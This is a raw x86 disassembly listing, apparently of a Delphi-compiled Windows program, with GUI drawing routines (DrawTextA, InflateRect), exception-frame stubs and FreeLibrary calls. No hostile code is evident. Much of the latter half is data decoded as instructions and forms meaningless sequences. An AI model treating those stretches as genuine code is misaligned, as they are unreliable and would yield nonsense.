lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_433c60
mov esi [ ebx + 0x208 ]
call sub_43a564
call sub_43a644
test al al
je r-xdata
push ebp
call sub_434638
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_433c60
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_427608
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4279ac
mov eax ebx
call sub_44e984
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_449264
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_446f84
mov eax [ ebp - 0x1c ]
call sub_4045e0
push eax
mov eax esi
call sub_427d50
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4347d9
lea eax [ ebp - 0x1c ]
call sub_404120
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_427724
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_427c70
mov edx r-xdata
mov eax esi
call sub_427bcc
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_434884
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4497d8
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_4348dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44c400
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_4349fd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44c400
call sub_403c08
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_446764
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_446740
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_434a18
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44e2ec
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_434a44
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_44e98c
pop esi
pop ebx
retn
sub_434a80
push 0x2e004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] ch
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax ] dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx ] dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx ] dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] dl
add [ eax ] al
push 0x15004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi ] dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] dl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax ] bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx ] bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx ] bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] bl
add [ eax ] al
push 0x1d004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi ] bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] bl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax ] al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx ] al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx ] al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] al
add [ eax ] al
push 0x5004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi ] al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] al
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ eax ] cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ecx ] cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edx ] cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ ebx ] cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi + edi * 8 ] cl
add [ eax ] al
push 0xd004876
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ esi ] cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add [ edi ] cl
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ch dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dh dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bh dh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add al bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add cl bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add dl bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add bl bh
inc [ eax ]
add [ eax + 0x76 ] ch
dec eax
add ah bh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax ] ch
jmp r-xdata
inc edi
add [ eax - 0x27ffbcb5 ] ch
0x4ba00047 0x43
sub_434c74
mov al 0xea
inc edi
add [ eax + 0x4b ] bh
inc ebx
add [ eax + 0x700047ea ] ch
dec ebx
inc ebx
add [ eax + 0x680047ea ] ah
dec ebx
inc ebx
add [ eax + 0x600047ea ] bl
dec ebx
inc ebx
add [ eax + 0x580047ea ] dl
dec ebx
inc ebx
add [ eax + 0x500047ea ] cl
dec ebx
inc ebx
add [ eax + 0x480047ea ] al
dec ebx
inc ebx
add [ eax - 0x16 ] bh
inc edi
add [ eax + 0x4b ] al
inc ebx
add [ eax - 0x16 ] dh
inc edi
add [ eax ] bh
dec ebx
inc ebx
add [ eax - 0x16 ] ch
inc edi
add [ eax ] dh
dec ebx
inc ebx
add [ eax - 0x16 ] ah
inc edi
add [ eax ] ch
dec ebx
inc ebx
add [ eax - 0x16 ] bl
inc edi
add [ eax ] ah
dec ebx
inc ebx
add [ eax - 0x16 ] dl
inc edi
add [ eax ] bl
dec ebx
inc ebx
add [ eax - 0x16 ] cl
inc edi
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x16 ] al
inc edi
add [ eax ] cl
dec ebx
inc ebx
add [ eax ] bh
0x4b000047 0x43
sub_434d6a
inc ebx
add [ eax - 0x7fffb817 ] bh
dec edx
inc ebx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_434db0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434db7
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404bd4
sub_434dec
push 0xfd004876
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_434e19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e20
retn
sub_434e2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434e5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e64
retn
mov eax [ rw-data ]
call sub_403390
sub_434f33
add [ edx + ebx * 2 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x15 ] cl
inc edi
add [ eax + 0x5b ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 + 0x47 ] al
add [ eax + 0x485c ] ch
add [ eax ] al
add [ eax - 0x15 ] al
inc edi
add [ edi + ebx * 2 + 0x48 ] bh
add [ eax ] al
cmp al 0xeb
inc edi
add al bh
pop esp
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jmp sub_434fb6
sub_434f6f
add al cl
pop ebp
dec eax
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 ] dh
inc edi
add [ eax + 0x5f ] bh
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jmp r-xdata
add [ ebx + 0x1b ] esi
mov eax sub_434f14
call sub_403ef4
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402da4
retn
sub_434f87
add [ eax ] bh
pop edx
dec eax
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_434fbc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_434ef8
sub_434ff0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_435015
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43501c
retn
sub_435037
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43507c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435083
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bd4
sub_43509f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4350e4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4350eb
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bd4
sub_4350fb
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_435151
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435158
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404120
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_435164
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4351a8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4351af
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4351bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4351e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4351e8
retn
sub_4351f4
clc
push ecx
inc ebx
add [ ebx ] al
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
add [ eax ] al
add [ esi + 0x28004352 ] dh
add [ eax ] al
add [ eax - 0x27ffbe6f ] dl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al ah
mov edi 0xbd340041
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
je r-xdata
or [ ebx + 0x6f ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
dec eax
popad
jb r-xdata
inc ecx
add [ edi * 4 + 0x75a40041 ] bh
inc ebx
xor al 0xbd
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
push ecx
inc ebx
add [ esi ] al
push 0x78655473
je r-xdata
inc ecx
add [ eax + eax ] ah
add bh bh
sbb al 0x76
inc ebx
add [ eax ] dh
jbe r-xdata
insb
jae r-xdata
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
int3
or [ ebx + 0x6f ] al
push 0x6e774f73
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x27
add [ eax ] al
add eax 0x614d0800
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080003 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ esi ] bl
add [ edi + eax * 4 + 0x1c0041 ] bl
add bh bh
aam 0x76
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
adc [ eax ] al
push ds
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
hlt
insb
jae r-xdata
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
loopne r-xdata
jb r-xdata
inc [ edi + esi * 2 + 0x43 ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc al 0x0
add bh bh
sub [ edi + 0x43 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ 0x38ff0000 ] ah
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ esi ] cl
push eax
popad
jb r-xdata
adc [ eax ] al
sbb [ eax ] al
add bh bh
add al 0x77
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd865646f
cmp eax 0x200045
add bh bh
les esi [ edi + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0004 ] al
insd
popad
dec ecx
outsb
js r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
jmp esp
push sub_4351e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4351e8
retn
rol [ edx + edx * 2 + 0x43 ] 0x0
add [ eax ] al
add [ edx + edx * 2 + 0x52cc0043 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ ebp + esi * 2 + 0x76b00043 ] ah
inc ebx
add [ ecx + eax * 8 ] ch
inc ecx
add [ ecx + eax * 8 + 0x41 ] bl
add [ ecx + eax * 8 + 0x41 ] dl
add [ eax + 0x75 ] cl
inc ebx
jne r-xdata
ja r-xdata
add [ eax ] al
call [ edi + esi * 2 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040009 ] al
add [ ecx ] al
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x4354c090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx * 2 + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xfffffffff04397e9
push esp
inc ebx
add [ eax + eax ] bl
add [ eax ] al
dec eax
xchg edx eax
inc ecx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add al bl
rol [ ecx ] 0x34
mov ebp 0xbd3c0041
inc ecx
outsb
je r-xdata
jb r-xdata
add [ eax + 0x2c004376 ] dh
rol [ ecx ] 0x5c
rol [ ecx ] 0x54
rol [ ecx ] 0x48
jne r-xdata
add [ eax ] al
mov eax eax
test [ edx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
insd
inc ebx
je r-xdata
inc ebx
outsd
add [ edx + eax * 8 + 0x41 ] al
add [ eax - 0x73ffbe3a ] cl
mov [ ecx ] 0x90
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
jl r-xdata
insd
inc ebx
je r-xdata
add ah bl
retn 0x41
js r-xdata
push esp
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
push ecx
inc ebx
add [ 0x44ff0000 ] bl
ja r-xdata
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ eax ] eax
insd
inc ebx
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
test [ edx + 0x43 ] dl
add [ edx + edx * 4 ] bl
inc ecx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
mov [ ecx ] 0x80
mov [ ecx ] 0x3c
nop
inc ebx
add [ ecx ] al
add [ eax ] al
inc ebp
jbe r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705000a ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add eax 0x6c797453
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
adc [ esi + 0x43 ] dl
outsb
je r-xdata
add [ ebx + 0x435530c0 ] cl
add [ ebx ] al
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
arpl [ ebx + 0x45 ] bp
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add al 0x8
or eax 0x64616548
jb r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
outsb
je r-xdata
jbe r-xdata
inc ebp
jns r-xdata
jae r-xdata
outsd
popad
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
inc ebx
add al cl
push edx
inc ebx
add [ ebx + 0x435678c0 ] cl
add [ eax ] cl
jbe r-xdata
jb r-xdata
pop es
outsb
dec esi
outsd
je r-xdata
outsd
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx * 2 + 0x740c0043 ] ch
jae r-xdata
jne r-xdata
outsd
dec eax
popad
jb r-xdata
add ah al
pop ecx
inc ebx
add al cl
push edx
inc ebx
add [ eax + edx + 0x40 ] dl
add [ edx * 2 - 0x3f74ffbd ] ch
adc [ edi + 0x43 ] dl
add [ eax ] cl
adc [ ebx + edx * 2 + 0x65 ] edx
arpl [ ecx + ebp * 2 + 0x6f ] si
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsd
outsb
je r-xdata
imul edx [ ebx + 0x74 ] 0x61
outsd
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
outsb
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add ah al
pop ecx
inc ebp
je r-xdata
jb r-xdata
jae r-xdata
je r-xdata
or [ esi ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx ] ecx
inc ecx
insb
insb
outsd
ja r-xdata
add [ ecx + edx + 0x52c80040 ] al
inc ebx
inc ebp
jbe r-xdata
outsb
push cs
push esp
push esp
outsd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ebx + 0x53 ] bp
outsb
inc esp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
add cl [ eax ]
or eax 0x64616548
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
insd
dec eax
popad
jb r-xdata
popad
arpl [ ebx + 0x42 ] bp
imul ebp [ gs : bp + 0xb ] 0x72547374
popad
insd
dec eax
popad
jb r-xdata
inc eax
add [ eax + 0x4358 ] cl
jb r-xdata
add [ ebx + edx * 2 ] ecx
push esp
inc ebx
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jns r-xdata
outsd
insd
dec eax
add al cl
push edx
inc ebx
add [ eax ] al
adc [ eax ] al
nop
xchg esp eax
push edi
inc ebx
add [ eax ] cl
and [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsb
je r-xdata
jb r-xdata
je r-xdata
sbb [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
outsb
je r-xdata
outsd
outsb
je r-xdata
popad
or dh [ ebx + esi * 2 + 0x54 ]
jb r-xdata
add [ eax ] eax
outsd
outsb
je r-xdata
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ eax ] bl
xor [ edx + 0x42 ] al
add [ ecx + ebx * 2 + 0x2780043 ] ch
add [ eax ] al
insb
xor eax [ eax + eax + 0x18 ]
add [ eax ] al
pop esp
pop ecx
inc ebx
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or al 0x53
pop es
inc edx
outsd
outsd
insb
popad
outsb
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov [ ecx + 0x43 ] bh
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
pop eax
inc ebx
add [ gs : eax ] eax
dec eax
popad
popad
je r-xdata
add al 0x8
push es
push ebx
insd
dec eax
popad
jb r-xdata
outsd
insb
adc al 0x54
inc ebx
jne r-xdata
jb r-xdata
outsd
insb
or [ edi ] al
je r-xdata
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
jb r-xdata
arpl [ ebx + 0x45 ] bp
outsb
or [ fs : ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc esp
add al al
xchg [ ebx ] eax
pushad
xchg edi eax
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 + 0x43 ] bl
outsd
insb
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
add ah dh
test al 0x44
add [ ebx + edi * 2 ] cl
inc ebx
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ ebx + edi * 2 + 0x43 ] dh
add [ eax + 0x500044d7 ] bh
mov ch 0x44
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add al ah
jns r-xdata
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
inc edx
add al [ eax ]
add [ ebx + esi + 0x44 ] ch
add [ eax ] bl
je r-xdata
jb r-xdata
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
or [ ebx ] cl
inc esi
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xb ] si
outsd
outsb
je r-xdata
je r-xdata
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
jae r-xdata
insb
jae r-xdata
or [ ebx + 0x6f ] al
push 0x616c4673
je r-xdata
add [ ecx + ebp * 8 - 0x2c03ffbc ] cl
inc esp
add [ edi + edx * 8 ] ah
inc esp
add [ eax - 0x3fffbc76 ] cl
mov al [ ebx ]
hlt
add [ eax - 0x4b ] dl
inc esp
add ah bl
test [ ebx ] al
rcl [ edx - 0x2a27ffbc ] 0x44
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
inc esp
add [ eax ] ch
add ah al
pop ecx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] al
inc ebx
add [ ebx ] al
or al 0x54
loop r-xdata
insb
je r-xdata
inc ebp
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
insd
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
popad
jb r-xdata
outsb
jb r-xdata
insd
dec eax
popad
jb r-xdata
jb r-xdata
rol [ ebp + edx * 2 + 0x17080043 ] 0x54
inc ebx
jne r-xdata
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax - 0x2fffbc88 ] bh
